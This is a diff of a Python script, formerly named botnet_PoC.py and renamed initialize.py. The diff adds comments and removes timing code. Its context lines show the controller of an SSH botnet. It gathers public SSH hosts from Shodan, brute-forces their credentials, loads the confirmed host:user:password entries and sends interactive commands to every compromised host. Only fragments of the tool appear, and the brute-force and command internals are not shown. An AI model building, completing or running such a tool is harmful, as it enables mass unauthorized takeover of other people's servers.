@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Name: botnet_PoC.py
+Main program using argparse to handle execution of selected programs.
+Name: initialize.py
 Author: PiningNorwegianBlue
 Date: August 5th, 2019
 """
@@ -54,6 +55,7 @@ def main():
     if args.shodan:
         print("Gathering public IP addresses running SSH from www.shodan.io")
         collection.shodan_gather(args.verbose)
+
 #  Bruteforce SSH credentials
     if args.brute:
         st = time.time()
@@ -86,6 +88,7 @@ def main():
         confirmed_creds = []
 
         def initiate_bots():
+            # Creates a list of confirmed IP:USERNAME:PASSWORD from confirmed.txt
             try:
                 with open("confirmed.txt", "r") as creds:
                     for target_creds in creds.readlines():  # Assuming one host:user:password per line
@@ -94,6 +97,7 @@ def main():
                 print("No creds.txt found. Please execute the dictionary attack module then try again.")
                 print(e)
         initiate_bots()
+        # Keeps issuing commands until the exit command is issued or an error is thrown
         command = input(">>> ")
         while command.lower() != "exit":
             for c in confirmed_creds:
@@ -106,6 +110,4 @@ def main():
 
 
 if __name__ == "__main__":
-    st = time.time()
     main()
-    print("Total time spent: ", time.time() - st)
